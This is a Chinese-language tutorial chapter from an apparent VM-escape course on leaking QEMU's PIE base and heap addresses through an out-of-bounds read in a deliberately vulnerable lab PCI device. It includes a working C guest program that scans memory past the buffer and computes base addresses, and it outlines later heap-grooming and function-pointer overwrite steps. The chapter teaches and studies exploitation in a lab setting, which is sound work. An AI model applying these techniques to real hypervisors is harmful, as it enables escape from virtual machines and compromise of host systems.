# Ch 17 — infoleak：洩漏 QEMU PIE base 與 heap 位址

> **目標**：把 Ch 16 的 OOB read 原語轉化成有效的 infoleak——從 VulnState 相鄰結構中讀出指向 QEMU `.text`/`.rodata` 段的指標，以及 heap 指標，反推 QEMU PIE base 和 heap base，讓後續的 OOB write 可以打到精確目標。

> **環境**：QEMU 9.0 / x86-64 / Linux host（Ubuntu 22.04/24.04），自編帶 debug symbol 的 QEMU，已掛載 vuln-pci。

---

## 為什麼需要這個？

QEMU 是一個普通的 Linux 行程，和所有現代二進位一樣活在 ASLR + PIE 的世界裡：

- **PIE（Position Independent Executable）**：每次 QEMU 啟動，`.text`/`.rodata`/`.bss` 整塊隨機滑動。所有函式指標（包括 `MemoryRegionOps` 裡的 `.read`/`.write`）的實際地址每次都不同。
- **heap ASLR**：`g_malloc`（底層是 glibc `malloc`）分配的 chunk 基底也是隨機的。heap 物件之間的相對距離固定，但絕對地址不可預測。

這意味著：就算你有 OOB write，在不知道 base 的情況下，你只能寫一個隨機的假地址——QEMU 一旦嘗試呼叫這個「指標」，立刻 segfault，攻擊機會報廢。

infoleak 的目的是**在不崩潰的情況下，把隱藏在 host 記憶體裡的指標讀出來，反算 base 地址**。有了 base，後面的每一步才能精準。

這個概念和 `binary_exploitation` 裡的 infoleak 完全相同：洩漏 GOT 條目 → 反推 libc base。VM escape 的版本是：洩漏 `MemoryRegionOps` 指標 → 反推 QEMU PIE base；洩漏 heap 指標 → 反推 heap base。

---

## 先建立直覺

```
QEMU 行程虛擬記憶體佈局（概念圖，地址隨機）
┌──────────────────────────────────────────┐  0x555555554000（PIE base，每次不同）
│  QEMU .text（程式碼）                     │  ← MemoryRegionOps 指標指向這裡
│  QEMU .rodata                             │  ← vuln_mmio_ops 是一個全域常數，在 .rodata
│  QEMU .data / .bss                        │
├──────────────────────────────────────────┤  libc base（另一個隨機基底）
│  libc .text                               │
├──────────────────────────────────────────┤  heap base（mmap 或 brk，隨機）
│  glibc heap                               │
│  ┌──────────────────────────────────────┐│
│  │  chunk: VulnState（g_malloc）         ││
│  │    pdev：PCIDevice                   ││
│  │    mmio：MemoryRegion                ││
│  │      .ops → vuln_mmio_ops ───────────╫╫──→ .rodata（PIE 段）
│  │      .name → "vuln-pci-mmio" ────────╫╫──→ heap（字串也在 heap）
│  │    buf[0x100]                         ││
│  │    status                             ││
│  ├──────────────────────────────────────┤│
│  │  chunk: 其他 QEMU 物件               ││
│  │    ... heap 指標、.text 指標 ...      ││
│  └──────────────────────────────────────┘│
│                                          │
└──────────────────────────────────────────┘

leak 的目標：
  MemoryRegion.ops（8 bytes 指標）→ 指向 QEMU .rodata → 反算 PIE base
  MemoryRegion.name（8 bytes 指標）→ 指向 heap → 反算 heap base
```

兩個 leak 分別解決兩個問題：
1. **PIE base**：知道 `vuln_mmio_ops` 在 `.rodata` 的 offset（靜態分析得），`ops 指標值 - offset` = PIE base
2. **heap base**：知道 `"vuln-pci-mmio"` 字串在 heap 的相對位置，但 heap 內部用 **相對 offset**（物件 A 和物件 B 之間的距離在同一次執行中固定），靜態 heap base 的意義較小——通常需要兩個 heap 指標做差值計算出相對距離，再配合 grooming 讓目標落在已知位置。

---

## 高價值洩漏點：`MemoryRegion.ops`

`MemoryRegion`（`include/exec/memory.h`）的結構如下（精簡版，QEMU 9.0）：

```c
struct MemoryRegion {
    Object parent_obj;          /* QOM base，大約 32 bytes */

    bool romd_mode;
    bool ram;
    bool subpage;
    bool readonly;
    /* ... 若干 bool 欄位 ... */

    const MemoryRegionOps *ops; /* ← 這個！指向 .rodata 的指標 */
    void *opaque;               /* ← 指向 VulnState 本身（heap 指標！） */
    AddressSpace *as;           /* ← AddressSpace 指標（也在 heap） */
    /* ... 更多欄位 ... */
    const char *name;           /* ← 指向 "vuln-pci-mmio" 字串（heap 指標） */
};
```

`ops` 欄位存著指向 `vuln_mmio_ops`（一個靜態常數，儲存在 QEMU binary 的 `.rodata` 段）的指標。這是最直接的 PIE base leak 來源：

```
ops 指標的值 = PIE_base + offset_of_vuln_mmio_ops_in_binary
PIE_base = ops 指標的值 - offset_of_vuln_mmio_ops_in_binary
```

`opaque` 欄位指向 `VulnState` 本身（這是 `memory_region_init_io` 傳入的 `opaque` 參數），是一個 heap 指標——洩漏它就洩漏了 `VulnState` 的 heap 地址，從而知道整個物件的位置。

---

## 計算 leak 需要的兩個靜態數字

### 1. `vuln_mmio_ops` 在 QEMU binary 中的 offset

```bash
# 在 host 上（QEMU binary 需帶 symbol 或至少 stripped 後還能用 nm/readelf）
nm ./qemu-system-x86_64 | grep vuln_mmio_ops
# 輸出範例：
# 0000000001234560 r vuln_mmio_ops
#                  ↑ 這是 VMA，減去 PIE base 就是 offset
#                  （strip 後不可用 nm，改用 IDA/Ghidra 找 .rodata 中的 ops 結構）

# 或者直接看 .rodata 的 VMA
readelf -S ./qemu-system-x86_64 | grep '\.rodata'
# 找到 .rodata section 的 VMA，再找 vuln_mmio_ops 在哪個 offset

# 最直接：用 gdb
gdb ./qemu-system-x86_64
(gdb) p &vuln_mmio_ops
# 輸出：$1 = (const MemoryRegionOps *) 0x555556789abc <vuln_mmio_ops>
# PIE base（第一次啟動時）= 0x555555554000（通常）
# offset = 0x555556789abc - 0x555555554000 = 0x1235abc
```

> **未實測，理論預期**。實際的 `vuln_mmio_ops` offset 取決於編譯結果。在你的 QEMU build 上執行 `gdb -ex "p &vuln_mmio_ops" -ex quit ./qemu-system-x86_64` 取得真實值，再減去 PIE base（QEMU 啟動時 gdb `info proc mappings` 第一行的起始地址）。

### 2. `MemoryRegion.ops` 距離 `buf` 起點的 offset

OOB read 是從 `buf[0]`（MMIO offset 0x04）往後讀，但 `MemoryRegion.ops` 在 `buf` **之前**（VulnState 佈局裡 mmio 在 buf 前面）。

這代表「往後 OOB read」讀不到 `mmio.ops`——我們需要的是讀到 VulnState **之外**的鄰接物件。

或者：利用 `buf` **之後**的資料——但 `buf` 之後是 `status`（4 bytes），之後是 VulnState 結束，再後面是下一個 heap chunk 的 header 和內容。

**兩種可能的 leak 策略**：

#### 策略 A：從 VulnState 外的鄰接 heap chunk 讀指標

VulnState 之後的 heap chunk 可能包含其他 QEMU 物件，那些物件裡也可能有 `.text`/`.rodata` 指標。具體取決於 heap 佈局（Ch 18 heap grooming 會深入）。

#### 策略 B：利用 `opaque` 反向讀 VulnState 地址

`MemoryRegion.opaque` 指向 VulnState 本身，是一個 heap 指標。如果 `opaque` 能被 OOB read 讀到（它在 mmio 結構裡，位於 buf 之前），需要另一條 OOB 路徑。但 vuln-pci 的 write OOB 路徑（`VULN_REG_BUF_WRITE`）和 read OOB 路徑（`VULN_REG_BUF_READ`）都以 buf 為基底向後延伸，無法直接讀到 buf **之前**的欄位。

**最可靠的方法**：對 VulnState 後方的記憶體做 OOB read，掃描識別出 8-byte 對齊的值是否落在合理的 QEMU 地址範圍（x86-64 userspace 在 `0x0000_0000_0000_0000` 到 `0x0000_7fff_ffff_ffff`，典型 QEMU binary 在 `0x5555_5555_xxxx_xxxx` 附近），找到後確認是指標。

---

## 具體 OOB 掃描 + leak 計算範例

```c
/*
 * 未實測，理論預期。
 * 在 Ubuntu guest + 自編 QEMU host 環境下驗證。
 * 驗證步驟：
 *   1. host: gdb -p $(pgrep qemu-system-x86)
 *   2. host: (gdb) p &vuln_mmio_ops → 記下地址 A
 *   3. guest: 執行此程式，觀察 leaked_ptr 是否等於 A
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

#define BAR0_SIZE   0x1000
#define REG_BUF_RD  0x04

static volatile uint8_t *bar0;

/* 讀 8 bytes（64-bit 指標） */
static uint64_t mmio_read64(uint64_t off) {
    uint64_t val = 0;
    for (int i = 0; i < 8; i++)
        val |= (uint64_t)bar0[REG_BUF_RD + off + i] << (i * 8);
    return val;
}

/* 判斷一個值是否「看起來像 QEMU .text/.rodata 指標」
 * QEMU PIE 啟動後通常落在 0x555555554000 ~ 0x5555ffffffff 的範圍
 * 這個判斷很粗略，實際可再加 page-aligned check 等 */
static int looks_like_text_ptr(uint64_t v) {
    return (v >> 40) == 0x5555 || (v >> 40) == 0x5556;
}

/* 判斷是否像 heap 指標（現代 Linux heap 通常在 0x5556 ~ 0x7fff 某段） */
static int looks_like_heap_ptr(uint64_t v) {
    uint64_t hi = v >> 40;
    return hi >= 0x5556 && hi <= 0x7fff;
}

int main(void)
{
    int fd = open("/sys/bus/pci/devices/0000:00:04.0/resource0",
                  O_RDWR | O_SYNC);
    if (fd < 0) { perror("open"); return 1; }

    bar0 = mmap(NULL, BAR0_SIZE, PROT_READ | PROT_WRITE,
                MAP_SHARED, fd, 0);
    if (bar0 == MAP_FAILED) { perror("mmap"); return 1; }

    printf("[*] Scanning OOB region (buf[0x100] ~ buf[0x7f8])...\n");

    uint64_t text_leak = 0, heap_leak = 0;
    uint64_t text_off  = 0, heap_off  = 0;

    /*
     * 掃描 buf[0x100] 之後的 8-byte 對齊位置。
     * 上限 0x7f8 是 BAR0 視窗的安全範圍（0xfff - REG_BUF_RD - 8）。
     */
    for (uint64_t off = 0x100; off <= 0x7f8; off += 8) {
        uint64_t val = mmio_read64(off);
        if (!text_leak && looks_like_text_ptr(val)) {
            text_leak = val;
            text_off  = off;
            printf("[+] Potential .text/.rodata ptr at buf[0x%lx] = 0x%016lx\n",
                   off, val);
        }
        if (!heap_leak && looks_like_heap_ptr(val) && val != text_leak) {
            heap_leak = val;
            heap_off  = off;
            printf("[+] Potential heap ptr at buf[0x%lx] = 0x%016lx\n",
                   off, val);
        }
        if (text_leak && heap_leak) break;
    }

    if (!text_leak) {
        printf("[-] No .text ptr found in OOB scan. "
               "VulnState 之後的 chunk 佈局不如預期，需要 heap grooming.\n");
        return 1;
    }

    /*
     * 計算 PIE base：
     *   text_leak = PIE_base + vuln_mmio_ops_offset
     *   PIE_base  = text_leak - vuln_mmio_ops_offset
     *
     * vuln_mmio_ops_offset 必須在 host 上靜態分析取得（見上文）。
     * 這裡用佔位符 0x1235abc（你的 build 結果不同，必須換！）
     */
    const uint64_t VULN_MMIO_OPS_OFFSET = 0x1235abc; /* ← 未實測佔位符！ */
    uint64_t qemu_pie_base = text_leak - VULN_MMIO_OPS_OFFSET;
    printf("[*] Estimated QEMU PIE base = 0x%016lx\n", qemu_pie_base);
    printf("    (驗證：host gdb 'info proc mappings' 第一行起始地址應等於此值)\n");

    if (heap_leak) {
        printf("[*] Heap leak = 0x%016lx (off=0x%lx)\n", heap_leak, heap_off);
        printf("    (驗證：host gdb 'p VulnState_ptr' 應在此值附近)\n");
    }

    munmap((void *)bar0, BAR0_SIZE);
    close(fd);
    return 0;
}
```

---

## 底層機制：為什麼 OOB 後方會有指標？

```
g_malloc 配置 VulnState（約 800 bytes）之後，
glibc malloc 從 heap 的同一個 arena 繼續配置後續物件。

heap chunk 佈局（glibc malloc，64-bit）：
  ┌────────────────────────────────────┐
  │ prev_size（8 bytes）               │ ← 前一個 chunk 的大小（僅在 free 時有意義）
  │ size（8 bytes）                    │ ← 本 chunk 大小 + 使用中 bit
  ├────────────────────────────────────┤ ← malloc 返回點（VulnState 指標）
  │ VulnState 內容                     │
  │   ...                              │
  │   buf[0x100]                       │
  │   status                           │
  ├────────────────────────────────────┤
  │ next chunk: prev_size              │ ← OOB 讀到 buf[0x100+] 時，先讀到這
  │ next chunk: size                   │  （純整數，不是指標）
  ├────────────────────────────────────┤
  │ next chunk 的內容（另一個 QEMU 物件）│ ← 這裡可能有指標
  │   ...指向 .text 或 heap 的欄位...   │
  └────────────────────────────────────┘

chunk header 的 size 欄位本身不是指標，但從這裡開始往後讀，
只要找到 8-byte 對齊且值域像指標的值，就是有效 leak 候選。
```

### MemoryRegion.ops 在 VulnState 內部的位置

`MemoryRegion.ops` 在 `VulnState.mmio` 欄位內部，而 `mmio` 在 `buf` 之**前**（VulnState 結構中 mmio 欄位比 buf 早）。因此從 buf[0x100] 往後 OOB read 讀不到 `mmio.ops`。

但這不是死路——有兩個替代方案：

**方案 1（更常用）**：讓 heap grooming 把一個含有 `.rodata` 指標的 QEMU 物件（例如另一個 MemoryRegion）佈置在 VulnState 後方，再用 OOB read 讀那個物件的 `.ops` 欄位。這是 Ch 18 heap grooming 的前導動機。

**方案 2（如果 device 有額外的 read 路徑）**：某些 device 設計會在 MMIO read 路徑暴露內部結構的欄位，可能直接讀到指標。vuln-pci 的 `status` 路徑只讀整數，但設計更複雜的 device 可能暴露更多。

在本課的 vuln-pci 利用鏈中，我們採用方案 1：先做簡單的 heap grooming，讓鄰接 chunk 含有 `MemoryRegionOps` 指標，再 OOB read 洩漏它。

---

## 對比與取捨

| | heap grooming 後讀鄰接物件指標 | DMA 讀 host 記憶體（若 device 支援） |
|--|-------------------------------|--------------------------------------|
| 前提 | 需要可控的 g_malloc 分配路徑 | 需要 device 有 DMA 且 host→guest 方向 |
| 穩定性 | 需要精確 grooming，可能多次嘗試 | DMA 路徑較固定，但不一定指向 .text |
| 資訊量 | 可讀任意鄰接物件的欄位 | 只能讀 device 設計允許的區域 |
| 難度 | 中（heap 佈局需分析） | 低（如果 device 設計允許）|

---

## 踩雷集錦

**雷 1：`MemoryRegion.ops` 在 `buf` 之前，OOB read 往後讀碰不到它**

直覺：buf 後面 OOB 就能讀到 MemoryRegion 裡的 ops 指標。
實際：VulnState 的記憶體佈局是 `pdev → mmio → buf → status`。`mmio` 在 `buf` **之前**，OOB read（buf 往後）讀不到 `mmio.ops`。正確做法是分析 VulnState **後方**的 heap chunk 或做 grooming，讓目標物件落在 buf 後面。

**雷 2：chunk header 的 size 欄位不是指標，不要拿來計算 base**

直覺：buf[0x100] 讀到的第一個 8-byte 值就是指標。
實際：buf 之後先是 VulnState 剩餘欄位（status），再來是 glibc chunk header（`prev_size` + `size`），這些是整數不是指標。指標通常出現在下一個 chunk 的物件內容裡。掃描時要做 looks_like_ptr 的判斷，不能直接拿第一個讀到的值算 base。

**雷 3：`vuln_mmio_ops_offset` 每次編譯都不同，不能硬編碼**

直覺：在教材裡看到的 offset 直接用。
實際：`vuln_mmio_ops` 在 binary 裡的 offset 取決於編譯器版本、優化等級、連結順序。每次重編 QEMU 都要重新量。用 gdb `p &vuln_mmio_ops` 或 `nm | grep vuln_mmio_ops` 取得當前 build 的值。

**雷 4：OOB 掃描途中可能觸碰到 unmapped 記憶體**

直覺：OOB 掃描可以一路掃到底。
實際：VulnState 之後的 heap chunk 是有效記憶體，但掃太遠（超過 glibc arena 末端）可能碰到 guard page，導致 QEMU SIGSEGV。保守做法：只掃 buf[0x100]~buf[0x200] 這個小範圍；確認有指標後停止。

**雷 5：ASLR 讓 .text 和 heap 的相對偏移也是隨機的**

直覺：知道 PIE base 就能算 heap base。
實際：`.text` 和 heap 是獨立的 mmap 區域，兩者相對距離每次都不同（Linux ASLR 對 heap 和 mmap 各自做隨機化）。heap base 必須另外洩漏，不能從 PIE base 算出。這是兩個獨立的 leak 目標。

---

## 進階：再往深一層

### 用 gdb 驗證 leak 值的正確性

```bash
# host 端 gdb attach QEMU
(gdb) info proc mappings
# 找到 qemu-system-x86_64 的第一段 mapping，就是 PIE base
# 例如：0x555555554000  r--p  qemu-system-x86_64

# 找 VulnState 在 heap 的地址
(gdb) p vuln_pci_state  # 如果有全域指標（debug build 可能有）
# 或者：
(gdb) watch -l s->buf[0]  # 在 vuln_mmio_write 觸發後看 s 的值

# 確認 MemoryRegion.ops 的值
(gdb) p s->mmio.ops
# 輸出：$1 = (const MemoryRegionOps *) 0x5555566789ab <vuln_mmio_ops>
# PIE base = 0x555555554000
# offset   = 0x5555566789ab - 0x555555554000 = 0x11249ab
```

### 為何 opaque 指標有時比 ops 更好用

`MemoryRegion.opaque` 指向 VulnState（即 `s` 本身），這是一個 heap 指標。如果能洩漏 `opaque`，就知道 VulnState 的 heap 地址，從而能精確計算 `buf` 的 host 地址——這在後面 OOB write 計算 target offset 時很有用。`ops` 給你 PIE base，`opaque` 給你 VulnState 的 heap 地址，兩個都要拿。

### 利用連結串列指標：g_malloc 的 FD/BK

glibc malloc 的 free chunk 在 fd/bk 欄位存著前後 free chunk 的地址（heap 地址）。如果 VulnState 相鄰的是一個被 free 掉的 chunk，OOB read 就能直接讀到 heap 地址（fd/bk），不需要 grooming。

但這需要 timing：VulnState 配置後、相鄰 chunk 被 free 之前做 OOB read 讀不到 fd/bk（因為 chunk 還在使用中）；相鄰 chunk 被 free 後 fd/bk 才有值。這是一個時序依賴的 leak 技術，難度較高，留給 Part 3 後半章節。

### PIE base 洩漏後的下一步計算

```
PIE base 確定後，任何靜態地址（函式、全域變數、ROP gadget）都能算出：
  target_addr = PIE_base + static_offset
  static_offset = 從 IDA/Ghidra/nm 取得

例如：
  system() 在 libc，不在 QEMU binary。但可以：
  1. 從 QEMU binary 的 GOT 找到 libc 的 plt stub
  2. 或者，从 QEMU binary 的 .text 裡的 call system 位置反推 libc base
  （更穩的做法是另外洩漏一個 libc 地址，Ch 22 ROP 章會處理這個）
```

---

## 動手練習

1. **靜態分析取 offset**：在 host 用 `nm ./qemu-system-x86_64 | grep vuln_mmio_ops` 或 gdb `p &vuln_mmio_ops` 取得 `vuln_mmio_ops` 的 VMA，減去 PIE base 得到 offset。記下這個值，後面每次 leak 計算都需要它。

2. **OOB 掃描**：在 guest 執行本章的掃描程式，列出所有「看起來像指標」的值。用 host gdb `info proc mappings` 確認哪些值落在 QEMU binary 的映射範圍內。

3. **計算 PIE base**：用找到的 `.rodata` 指標減去靜態 offset，得到 PIE base。用 host gdb `info proc mappings` 驗證——是否和第一段 mapping 的起始地址相符？

4. **找 heap 指標**：在掃描結果中找到看起來像 heap 的值（通常是 `mmap` 返回的地址，比 PIE base 大但比 stack 小）。用 host gdb 確認這個值落在哪個 heap chunk 裡。

5. **組裝 leak 函式**：把「掃描 → 取 offset → 計算 base」包成一個可重用的函式，後面 Ch 18-22 的 exploit 都會呼叫它。

---

## 本章重點整理

- infoleak 的目的是在不崩潰的情況下洩漏 QEMU PIE base 和 heap 地址，讓後續 OOB write 能精準打目標。
- **`MemoryRegion.ops`** 是最佳 PIE base leak 來源：指向 `.rodata` 中的 `vuln_mmio_ops`，`洩漏值 - 靜態 offset = PIE base`。
- **`MemoryRegion.opaque`** 是最佳 heap leak 來源：指向 VulnState 本身。
- 由於 `mmio` 在 `buf` 之前，直接 OOB read（往後）讀不到 `mmio.ops`；需要 heap grooming 讓含有 `.text` 指標的物件落在 VulnState 後方。
- 掃描策略：讀 8-byte 對齊的值，判斷是否落在 QEMU binary 或 heap 的合理地址範圍。
- PIE base 和 heap base 是兩個獨立的 leak，不能互算——兩個都需要。
- `vuln_mmio_ops` 的靜態 offset 每次重編 QEMU 都會變，必須動態取得。

---

## 自我檢核

- [ ] 解釋為何 OOB read buf 後方讀不到 VulnState.mmio.ops（mmio 在 buf 之前）
- [ ] 說出「PIE base = 洩漏值 - 靜態 offset」這個計算需要準備哪兩個數字
- [ ] 解釋 PIE base 和 heap base 為何必須分別洩漏（ASLR 對兩者獨立隨機化）
- [ ] 說明 glibc chunk header（size/prev_size）為什麼不能當 leak 用
- [ ] 指出本章掃描程式中 `looks_like_text_ptr` 的判斷條件的局限性

---

## 延伸閱讀

1. **`include/exec/memory.h`（QEMU 9.0 source）**（[GitLab](https://gitlab.com/qemu-project/qemu/-/blob/stable-9.0/include/exec/memory.h)）
   - 讀哪裡：`struct MemoryRegion` 的定義，重點看 `ops`/`opaque`/`name` 的相對位置。
   - 學什麼：用 `offsetof(MemoryRegion, ops)` 等算出精確欄位 offset，而不是猜。
   - 關聯：本章計算 OOB 需要打到的確切 offset 全靠這個結構定義。

2. **「Exploiting the DRAM rowhammer bug to gain kernel privileges」（Google Project Zero）**（[googleprojectzero.blogspot.com](https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)）
   - 讀哪裡：第一部分的記憶體 layout 分析方法。
   - 學什麼：如何在不知道精確地址的情況下，透過掃描和啟發式判斷定位記憶體裡的有用指標——這和本章 OOB 掃描的方法論相同。
   - 關聯：vm escape 和 browser pwn 的 infoleak 方法論來自同一個根。

3. **`pwntools` 文件中 ROP 與 memory layout 章節**（[docs.pwntools.com](https://docs.pwntools.com/en/stable/)）
   - 讀哪裡：`pwntools.elf` 模組、`ELF().symbols[]` 使用方法。
   - 學什麼：如何從 Python 自動化取靜態 offset（`ELF('./qemu-system-x86_64').symbols['vuln_mmio_ops']`），讓 exploit script 不用手動查 nm。
   - 關聯：Ch 22 ROP exploit 會用 pwntools 自動計算所有 offset。

4. **「QEMU Escape from CVE-2019-14378」（Simon Huang @ 360 Vulcan）**
   - 搜尋關鍵字：`CVE-2019-14378 QEMU escape infoleak`，找原始 writeup 或 BlackHat 議程。
   - 讀哪裡：整篇文，重點看他如何定位並洩漏指標，以及計算 base 的具體方法。
   - 學什麼：真實 CTF/研究場景的 infoleak 流程，與本章手法的異同。
   - 關聯：CVE-2019-14378 是 heap OOB，利用鏈的 infoleak 步驟和本章非常接近。

5. **`pahole`（dwarf-tools/dwarves）man page + 用法**（`man pahole`）
   - 讀哪裡：`pahole -C VulnState ./qemu-system-x86_64` 的輸出格式說明。
   - 學什麼：從 DWARF debug info 取精確的結構 offset，替代手算——這是 VM escape 研究者每天都在用的工具。
   - 關聯：本章和 Ch 18 都要用 pahole 確認 VulnState 的精確佈局，才能計算 OOB offset。

---

> 你現在有了 QEMU PIE base 和 heap base。下一步是把 OOB write 變成真正有破壞力的操作——在 heap 上做 grooming，把帶有 function pointer 的物件佈置在 VulnState 之後，再用 OOB write 精確地覆蓋那個 function pointer。

→ [Ch 18 — device emulation 裡的 heap overflow](./18-heap-overflow.md)
